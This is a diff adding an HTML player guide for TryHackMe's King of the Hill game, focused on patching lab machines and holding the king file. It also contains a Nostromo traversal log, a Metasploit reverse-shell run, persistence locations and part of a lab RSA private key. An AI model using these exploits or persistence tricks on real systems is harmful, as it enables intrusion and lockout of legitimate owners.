@@ -1,0 +1,588 @@
+<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"> <style>.markdown-body {box-sizing: border-box;min-width: 200px;max-width:
+	 	980px;margin: 0 auto;padding: 45px;}	@media (max-width: 767px) {.markdown-body
+		{padding: 15px;}}.markdown-body hr::after,.markdown-body::after{clear:both}
+		@font-face{font-family:octicons-link;src:url(data:font/woff;charset=utf-8;
+		base64,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)
+		format('woff')}.markdown-body{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;
+		color:#24292e;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",
+		Helvetica,Arial,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\",\"Segoe UI Symbol\"
+		;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body .pl-c{color:#6a737d}
+		.markdown-body .pl-c1,.markdown-body .pl-s .pl-v{color:#005cc5}.markdown-body .pl-e,
+		.markdown-body .pl-en{color:#6f42c1}.markdown-body .pl-s .pl-s1,.markdown-body .pl-smi{color:#24292e}
+		.markdown-body .pl-ent{color:#22863a}.markdown-body .pl-k{color:#d73a49}.markdown-body .pl-pds,
+		.markdown-body .pl-s,.markdown-body .pl-s .pl-pse .pl-s1,.markdown-body .pl-sr,.markdown-body 
+		.pl-sr .pl-cce,.markdown-body .pl-sr .pl-sra,.markdown-body .pl-sr .pl-sre{color:#032f62}.markdown-body
+		.pl-smw,.markdown-body .pl-v{color:#e36209}.markdown-body .pl-bu{color:#b31d28}.markdown-body
+		.pl-ii{color:#fafbfc;background-color:#b31d28}.markdown-body .pl-c2{color:#fafbfc;background-color:#d73a49}
+		.markdown-body .pl-c2::before{content:\"^M\"}.markdown-body .pl-sr .pl-cce{font-weight:700;color:#22863a}
+		.markdown-body .pl-ml{color:#735c0f}.markdown-body .pl-mh,.markdown-body .pl-mh .pl-en,.markdown-body
+		.pl-ms{font-weight:700;color:#005cc5}.markdown-body .pl-mi{font-style:italic;color:#24292e}.markdown-body
+		.pl-mb{font-weight:700;color:#24292e}.markdown-body .pl-md{color:#b31d28;background-color:#ffeef0}
+		.markdown-body .pl-mi1{color:#22863a;background-color:#f0fff4}.markdown-body .pl-mc{color:#e36209;
+		background-color:#ffebda}.markdown-body .pl-mi2{color:#f6f8fa;background-color:#005cc5}
+		.markdown-body .pl-mdr{font-weight:700;color:#6f42c1}.markdown-body .pl-ba{color:#586069}
+		.markdown-body .pl-sg{color:#959da5}.markdown-body .pl-corl{text-decoration:underline;
+		color:#032f62}.markdown-body .octicon{display:inline-block;fill:currentColor;vertical-align:text-bottom}
+		.markdown-body hr::after,.markdown-body hr::before,.markdown-body::after,
+		.markdown-body::before{display:table;content:\"\"}.markdown-body a{background-color:transparent;
+		color:#0366d6;text-decoration:none}.markdown-body a:active,.markdown-body a:hover{outline-width:0}
+		.markdown-body h1{margin:.67em 0}.markdown-body img{border-style:none}.markdown-body hr{box-sizing:content-box}
+		.markdown-body input{font:inherit;margin:0;overflow:visible;font-family:inherit;font-size:inherit;line-height:inherit}
+		.markdown-body dl dt,.markdown-body strong,.markdown-body table th{font-weight:600}.markdown-body code,
+		.markdown-body pre{font-family:SFMono-Regular,Consolas,\"Liberation Mono\",Menlo,Courier,monospace}
+		.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}
+		.markdown-body a:hover{text-decoration:underline}.markdown-body td,.markdown-body th{padding:0}
+		.markdown-body blockquote{margin:0}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}
+		.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body
+		ul ul ol{list-style-type:lower-alpha}.markdown-body dd{margin-left:0}.markdown-body 
+		.pl-0{padding-left:0!important}.markdown-body .pl-1{padding-left:4px!important}.markdown-body 
+		.pl-2{padding-left:8px!important}.markdown-body .pl-3{padding-left:16px!important}.markdown-body 
+		.pl-4{padding-left:24px!important}.markdown-body .pl-5{padding-left:32px!important}.markdown-body 
+		.pl-6{padding-left:40px!important}.markdown-body>:first-child{margin-top:0!important}
+		.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;
+		text-decoration:none}.markdown-body .anchor{float:left;padding-right:4px;margin-left:-20px;
+		line-height:1}.markdown-body .anchor:focus{outline:0}.markdown-body blockquote,
+		.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,
+		.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{overflow:hidden;background:#e1e4e8;
+		height:.25em;padding:0;margin:24px 0;border:0}.markdown-body blockquote{padding:0 1em;color:#6a737d;
+		border-left:.25em solid #dfe2e5}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;
+		border-bottom:1px solid #eaecef}.markdown-body blockquote>:first-child{margin-top:0}
+		.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,
+		.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;
+		margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1 .octicon-link,.markdown-body 
+		h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body 
+		h5 .octicon-link,.markdown-body h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}
+		.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,
+		.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}
+		.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body 
+		h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor 
+		.octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1{font-size:2em}
+		.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body
+		h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body ol,.markdown-body ul{padding-left:2em}
+		.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}
+		.markdown-body li{word-wrap:break-all}.markdown-body li>p{margin-top:16px}.markdown-body li+li{margin-top:.25em}
+		.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic}.markdown-body
+		dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{border-spacing:0;border-collapse:collapse;display:block;
+		width:100%;overflow:auto}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}
+		.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table 
+		tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:#fff}
+		.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body 
+		code{padding:.2em .4em;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body 
+		pre{word-wrap:normal}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:0 0;
+		border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}
+		.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;
+		background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;
+		overflow:visible;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body 
+		.full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body kbd{display:inline-block;
+		padding:3px 5px;font:11px SFMono-Regular,Consolas,\"Liberation Mono\",Menlo,Courier,monospace;line-height:10px;color:#444d56;
+		vertical-align:middle;background-color:#fafbfc;border:1px solid #d1d5da;border-bottom-color:#c6cbd1;border-radius:3px;
+		box-shadow:inset 0 -1px 0 #c6cbd1}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}
+		.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}
+		.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}.markdown-body hr{border-bottom-color:#eee}</style><title>TryHackMe KoTH Tricks</title></head><body class="markdown-body"><h1>TryHackMe KoTH Tricks</h1>
+<ul>
+<li>“Don’t use cheats on koth, just play for fun, learn from other players, learn new techniques, for me, this is the essence of a battlegrounds style game”.</li>
+</ul>
+<h2>Introduction</h2>
+<p>King of the Hill (KoTH) is a competitive hacking game, where you play against 10 other hackers to compromise a machine and then patch its vulnerabilities to stop other players from also gaining access. The longer you maintain your access, the more points you get.</p>
+<p>But the real challenge for the koth player is defending /root/king.txt . On windows machines king is in C:\king.txt or in C:\Users\Admininstrator\king-server\king.txt.</p>
+<h2>Defense/Patching Linux Box</h2>
+<p>On linux machines, most people get root through PwnKit, to prevent players from getting root access, just remove the suid from the pkexec binary.</p>
+<h3>[ Patching Root Access ]</h3>
+<pre><code>chmod -s /usr/bin/pkexec
+</code></pre>
+<p>In addition to pwnkit, players abuse SUID in binaries like find, bash, mount, among other binaries, to remove SUID from binaries just use the command;</p>
+<pre><code>chmod -s $(which find)
+</code></pre>
+<p>You can find binaries that have SUID and if through the binary you found, there is a way to abuse it to have a rooted shell, to find binaries like that you can use the following command;</p>
+<pre><code>find / -perm /4000 2&gt;/dev/null
+</code></pre>
+<p>In addition to SUID, you can check the following files;</p>
+<ul>
+<li>/etc/sudoers - Players abuse this to build their persistence.</li>
+<li>/etc/sudoers.d - Players abuse this to build their persistence.</li>
+<li>/etc/crontab - Players abuse this to build their persistence.</li>
+<li>/var/spool/* - Players abuse this to build their persistence.</li>
+<li>/etc/systemd/system - Players abuse this to build their persistence.</li>
+<li>*/.ssh/ - Players abuse this to build their persistence.</li>
+<li>/opt/</li>
+<li>/etc/passwd - Players Create your own user.</li>
+<li>/etc/shadow - Players Create your own user.</li>
+<li>*/.bashrc - Players abuse this to build their persistence.</li>
+</ul>
+<p>You can also change the password for the root user, among other existing users on the machine, for this, you can use onelines, like;</p>
+<pre><code>echo -e &quot;hackerpassword\nhackerpassword&quot; | passwd root
+echo -e &quot;hackerpassword\nhackerpassword&quot; | passwd user
+</code></pre>
+<p>I think this is enough to protect the machine, if you are the first to enter the machine, and patching so that other players do not have root, you already have a great advantage.</p>
+<h3>[ Patching Web Application Vulnerable ]</h3>
+<p>Most koth linux machines, you can get a reverse shell, through a simple command injection, you can get an LFI, Backdoors on different ports, among others. I’ll put the main ways to defend, The patched codes too.</p>
+<ul>
+<li>Command Injection in Tyler Machine.</li>
+</ul>
+<pre><code>[root@tyler betatest]# cat checkuser.php
+&lt;?php
+if (isset($_POST['submit'])) {
+    $user = $_POST['user'];
+    if (preg_match(&quot;/^[a-zA-Z0-9_]+$/&quot;, $user)) {
+        $user = escapeshellarg($user);
+
+        $cmd1 = &quot;cat /etc/passwd | grep &quot; . $user;
+        echo system($cmd1);
+    } else {
+        echo &quot;Invalid user input&quot;;
+    }
+// flag{REDACTED}
+}
+?&gt;
+[root@tyler betatest]#
+
+</code></pre>
+<ul>
+<li>LFI In Lion Machine.</li>
+</ul>
+<pre><code>root@lion:/var/www/nginx# cat -v index.php
+&lt;html&gt;
+&lt;head&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark&quot;&gt;
+  &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;Gloria's Personal Site&lt;/a&gt;
+  &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarColor02&quot; aria-controls=&quot;navbarColor02&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+  &lt;/button&gt;
+
+  &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarColor02&quot;&gt;
+    &lt;ul class=&quot;navbar-nav mr-auto&quot;&gt;
+      &lt;li class=&quot;nav-item active&quot;&gt;
+        &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home &lt;span class=&quot;sr-only&quot;&gt;(current)&lt;/span&gt;&lt;/a&gt;
+      &lt;/li&gt;
+      &lt;li class=&quot;nav-item&quot;&gt;
+        &lt;a class=&quot;nav-link&quot; href=&quot;?page=posts.php&quot;&gt;Posts&lt;/a&gt;
+      &lt;/li&gt;
+      &lt;li class=&quot;nav-item&quot;&gt;
+        &lt;a class=&quot;nav-link&quot; href=&quot;?page=about.php&quot;&gt;About&lt;/a&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/div&gt;
+&lt;/nav&gt;
+&lt;div class=&quot;container&quot;&gt;&lt;br /&gt;
+&lt;h2&gt;Gloria's Personal Site&lt;/h2&gt;
+&lt;img src=&quot;image.png&quot; style=&quot;width:400px;height:300px;&quot;&gt;&lt;br /&gt;
+&lt;?php
+$allowedPages = array(
+    'posts.php',
+    'about.php'
+);
+
+$page = $_GET[&quot;page&quot;];
+
+if (in_array($page, $allowedPages)) {
+    include($page);
+} else {
+    echo &quot;No LFI for You x)&quot;;
+}
+?&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+root@lion:/var/www/nginx#
+</code></pre>
+<ul>
+<li>Unrestricted File load and Perl Reverse shell in Lion Machine.</li>
+</ul>
+<pre><code>root@lion:/var/www/html/upload# ls
+image.png  index.php  uploads
+root@lion:/var/www/html/upload# cat -v index.php
+&lt;?php
+$filename = uniqid() . &quot;-&quot; . time();
+$extension = pathinfo($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;], PATHINFO_EXTENSION);
+$basename = $filename . '.' . $extension;
+$target_dir = &quot;uploads/&quot;;
+$target_file = $target_dir . $basename;
+$uploadOk = 1;
+
+if (isset($_POST[&quot;submit&quot;])) {
+    // Check if file already exists
+    if (file_exists($target_file)) {
+        echo &quot;Sorry, file already exists.&quot;;
+        $uploadOk = 0;
+    }
+
+    // Check file size (limit to 500KB)
+    $maxFileSize = 500000;
+    if ($_FILES[&quot;fileToUpload&quot;][&quot;size&quot;] &gt; $maxFileSize) {
+        echo &quot;Sorry, your file is too large.&quot;;
+        $uploadOk = 0;
+    }
+
+    // Validate file extension
+    $allowedExtensions = array(&quot;jpg&quot;, &quot;jpeg&quot;, &quot;png&quot;, &quot;gif&quot;);
+    if (!in_array($extension, $allowedExtensions)) {
+        echo &quot;Sorry, only JPG, JPEG, PNG, and GIF files are allowed.&quot;;
+        $uploadOk = 0;
+    }
+
+    // Check if $uploadOk is set to 0 by an error
+    if ($uploadOk == 0) {
+        echo &quot;Sorry, your file was not uploaded.&quot;;
+    } else {
+        // If everything is ok, try to upload file
+        if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) {
+            echo &quot;The file &quot; . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]) . &quot; has been uploaded.&quot;;
+            // Process or store the uploaded file securely
+            // Do not execute the file directly
+        } else {
+            echo &quot;Sorry, there was an error uploading your file.&quot;;
+        }
+    }
+}
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;center&gt;&lt;br /&gt;
+        &lt;img src=&quot;image.png&quot; style=&quot;width:300px;height:300px;&quot;&gt;&lt;br /&gt;&lt;br /&gt;
+        &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+            Select file to upload:
+            &lt;input type=&quot;file&quot; name=&quot;fileToUpload&quot; id=&quot;fileToUpload&quot;&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;Upload&quot; name=&quot;submit&quot;&gt;
+        &lt;/form&gt;
+    &lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+root@lion:/var/www/html/upload#
+</code></pre>
+<ul>
+<li>Nostromo RCE In Lion Machine.</li>
+</ul>
+<pre><code>root@lion:/var/nostromo/htdocs# ls
+cgi-bin  image.png  index.html  nostromo.gif
+root@lion:/var/nostromo/htdocs# ss -anlpt|grep 8080
+LISTEN     0      128          *:8080                     *:*                   users:((&quot;nhttpd&quot;,pid=958,fd=3))
+root@lion:/var/nostromo/htdocs# export machineIP=10.10.76.94
+root@lion:/var/nostromo/htdocs# kill -9 958
+root@lion:/var/nostromo/htdocs# python3 -m http.server 8080 -b $machineIP
+Serving HTTP on 10.10.76.94 port 8080 ...
+10.14.39.200 - - [01/Jul/2023 12:38:53] code 501, message Unsupported method ('POST')
+10.14.39.200 - - [01/Jul/2023 12:38:53] &quot;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0&quot; 501 -
+10.14.39.200 - - [01/Jul/2023 12:39:57] &quot;GET / HTTP/1.1&quot; 200 -
+10.14.39.200 - - [01/Jul/2023 12:40:05] &quot;GET / HTTP/1.1&quot; 200 -
+10.14.39.200 - - [01/Jul/2023 12:40:05] code 501, message Unsupported method ('POST')
+10.14.39.200 - - [01/Jul/2023 12:40:05] &quot;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1&quot; 501 -
+</code></pre>
+<p>In My Machine.</p>
+<pre><code>msf6 exploit(multi/http/nostromo_code_exec) &gt; run
+
+[*] Started reverse TCP handler on 10.14.39.200:4444
+[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)
+[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
+[*] Configuring Automatic (Unix In-Memory) target
+[*] Sending cmd/unix/reverse_perl command payload
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/http/nostromo_code_exec) &gt;
+</code></pre>
+<ul>
+<li>Backdoor In Panda Machine.</li>
+</ul>
+<pre><code>[root@panda 06d63d6798d9b6c2f987f045b12031d6]# ls
+flag  index.php
+[root@panda 06d63d6798d9b6c2f987f045b12031d6]# cat -v index.php
+&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+&lt;body&gt;
+ &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+  &lt;label for=&quot;cmd&quot;&gt;cmd: &lt;/label&gt;
+  &lt;input type=&quot;text&quot; id=&quot;cmd&quot; name=&quot;cmd&quot;&gt;
+  &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;
+&lt;/form&gt;
+&lt;?php
+if ($_POST['cmd']){
+  echo &quot;No command execution, matheuz was kidding you x)&quot;;
+}
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+[root@panda 06d63d6798d9b6c2f987f045b12031d6]#
+</code></pre>
+<ul>
+<li>Changing Password Tomcat in Shrek Machine.</li>
+</ul>
+<pre><code>[root@shrek conf]# pwd
+/opt/tomcat/conf
+[root@shrek conf]# cat tomcat-users.xml
+&lt;---------------------------------------------------&gt;
+&lt;tomcat-users&gt;
+&lt;user username=&quot;admin&quot; password=&quot;yourpassword&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;
+&lt;/tomcat-users&gt;
+&lt;---------------------------------------------------&gt;
+[root@shrek conf]#
+</code></pre>
+<ul>
+<li>File containing SSH-KEY for user.</li>
+</ul>
+<pre><code>[root@shrek html]# pwd;head -n10 Cpxtpt2hWCee9VFa.txt #This is SSH-KEY
+/var/www/html
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAsKHyvIOqmETYwUvLDAWg4ZXHb/oTgk7A4vkUY1AZC0S6fzNE
+JmewL2ZJ6ioyCXhFmvlA7GC9iMJp13L5a6qeRiQEVwp6M5AYYsm/fTWXZuA2Qf4z
+8o+cnnD+nswE9iLe5xPl9NvvyLANWNkn6cHkEOfQ1HYFMFP+85rmJ2o1upHkgcUI
+ONDAnRigLz2IwJHeZAvllB5cszvmrLmgJWQg2DIvL/2s+J//rSEKyISmGVBxDdRm
+T5ogSbSeJ9e+CfHtfOnUShWVaa2xIO49sKtu+s5LAgURtyX0MiB88NfXcUWC7uO0
+Z1hd/W/rzlzKhvYlKPZON+J9ViJLNg36HqoLcwIDAQABAoIBABaM5n+Y07vS9lVf
+RtIHGe4TAD5UkA8P3OJdaHPxcvEUWjcJJYc9r6mthnxF3NOGrmRFtDs5cpk2MOsX
+u646PzC3QnKWXNmeaO6b0T28DNNOhr7QJHOwUA+OX4OIio2eEBUyXiZvueJGT73r
+I4Rdg6+A2RF269yqrJ8PRJj9n1RtO4FPLsQ/5d6qxaHp543BMVFqYEWvrsdNU2Jl
+[root@shrek html]# echo &quot;&quot; &gt; Cpxtpt2hWCee9VFa.txt
+[root@shrek html]# cat Cpxtpt2hWCee9VFa.txt
+
+[root@shrek html]#
+
+</code></pre>
+<h3>[ Protect King File ]</h3>
+<p>Undoubtedly, the biggest challenge of KoTH is protecting the king, many people send me messages asking how do I protect the king, or about how to protect the king, So, in this session I decided to put my defense technique in KoTH, and I will also put techniques that other players use.</p>
+<p>We can say that chattr today on KoTH is not as strong as it used to be, as many players created their own defense techniques on king. But here I’m going to mention defense techniques in king, which you can use, and are also techniques that other players use in every koth game.</p>
+<ul>
+<li>Whiles for protect /root/king.txt using chattr.</li>
+</ul>
+<blockquote>
+<p>while [ 1 ]; do chattr -ia /root/king.txt 2&gt;/dev/null; echo -n “YourNick” &gt;| /root/king.txt 2&gt;/dev/null; chattr +ia /root/king.txt 2&gt;/dev/null; done &amp;</p>
+</blockquote>
+<ul>
+<li>Mount Trick.</li>
+</ul>
+<pre><code>sudo lessecho USERNAME &gt; /root/king.txt
+sudo dd if=/dev/zero of=/dev/shm/root_f bs=1000 count=100
+sudo mkfs.ext3 /dev/shm/root_f
+sudo mkdir /dev/shm/sqashfs
+sudo mount -o loop /dev/shm/root_f /dev/shm/sqashfs/
+sudo chmod -R 777 /dev/shm/sqashfs/
+sudo lessecho USERNAME &gt; /dev/shm/sqashfs/king.txt
+sudo mount -o ro,remount /dev/shm/sqashfs
+sudo mount -o bind /dev/shm/sqashfs/king.txt /root/king.txt
+sudo rm -rf /dev/shm/root_f 
+</code></pre>
+<p>By the way, if you try to put your nick once in /root/king.txt and the message “Read-only file system” appears, most likely, the other player is using this technique.</p>
+<p>To undo this, just use umount.</p>
+<blockquote>
+<p>umount -l /root/king.txt or umount -l /root</p>
+</blockquote>
+<ul>
+<li>“symbolic link” using “ln” command.</li>
+</ul>
+<pre><code class="language-mkdir">cp -r /root/ /dev/shm/...
+cd /dev/shm/.../root
+rm king.txt
+echo &quot;YourNick&quot; &gt; ...
+ln -s ... king.txt
+</code></pre>
+<p>It’s up to your imagination what you can try to add to this and what to do x).</p>
+<ul>
+<li>Chattr for block /root.</li>
+</ul>
+<blockquote>
+<p>cd / &amp;&amp; chattr +ia root</p>
+</blockquote>
+<ul>
+<li>Oneline using date, to combine.</li>
+</ul>
+<pre><code>while true; do
+    chattr -ia /root/king.txt 2&gt;/dev/null
+    echo -n &quot;YourNick&quot; &gt;| /root/king.txt 2&gt;/dev/null
+    chattr +ia /root/king.txt 2&gt;/dev/null
+    sleep $((60 - $(date +%S) % 60))
+done &amp;
+
+</code></pre>
+<ul>
+<li>Intercept Syscall Write from /root/king.txt.</li>
+</ul>
+<blockquote>
+<p>This technique is very advanced using LKM ( Loadable Kernel Module) that is, at the kernel/ring0 level, me and F11snipe use it, basically if you try to put your nickname in king.txt, nothing will happen and the nickname of who is using the intercept syscall write will remain, as this file is being intercepted.</p>
+</blockquote>
+<p>In this technique, I plan to add my C code along with its Makefile very soon.</p>
+<ul>
+<li>LD_PRELOAD for defense of king.</li>
+</ul>
+<p>Soon I will also add a code for this way to defend the king.</p>
+<ul>
+<li>Programs written in C to protect the king.</li>
+</ul>
+<p>The <a href="https://raw.githubusercontent.com/ChrisPritchard/ctf-writeups/master/tryhackme-koth/tools/kingmaker.c" rel="nofollow">kingmaker</a> that “Aquinas” created a while ago, to defend the king, is really good, and you can take the code in C, study and improve it.</p>
+<p>These are the main ways to defend the king, other KoTH players also use these same techniques to defend the king.</p>
+<p>I think that from this, you can have A LOT of ideas, even ideas for you to create your own script/way to defend the king.</p>
+<h3>[ Defending Linux Box From Rootkits ]</h3>
+<p>Some players use rootkits in KoTH games, I think that many players don’t know how to defend against a rootkit, so it is in this section that I will put some points to be able to defend and disable a rootkit.</p>
+<ul>
+<li>sysctl</li>
+</ul>
+<p>Basically the command “sudo sysctl -w kernel.modules_disabled=1” disables the loading of kernel modules in the Linux operating system, restricting the ability to load and unload modules during execution. This can be useful for improving security by preventing unauthorized or malicious modules from being loaded into the system’s kernel.</p>
+<p>For this to work you would have to run this command before the player loads your rootkit/LKM. Because if the enemy player loads the rootkit first, this command will have no effect.</p>
+<p>Hint: you really have to be really quick as there are some people who use autopwn.</p>
+<blockquote>
+<p>sudo sysctl -w kernel.modules_disabled=1</p>
+</blockquote>
+<ul>
+<li>blocking insertion of new modules using LKM</li>
+</ul>
+<p>it is possible to make LKM that blocks the insertion of new modules, I had made one, however, when I went to load it in KoTH machines, the machine broke completely, so I could not proceed with this, but you can search, and try to create your own own.</p>
+<ul>
+<li>Diamorphine rootkit with its default kill signal</li>
+</ul>
